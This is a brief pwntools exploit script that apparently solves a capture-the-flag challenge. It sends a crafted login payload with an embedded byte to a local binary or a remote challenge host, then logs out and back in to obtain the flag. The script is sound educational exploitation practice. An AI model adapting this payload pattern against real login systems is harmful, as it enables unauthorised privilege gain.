from pwn import *

PROGNAME = "./root"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 3

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

p.sendline(b"login " + b"BBBB" + p8(9) + b"CCCDDDD")
p.sendline("logout")
p.sendline("login A")
p.sendline("getflag")
p.interactive()
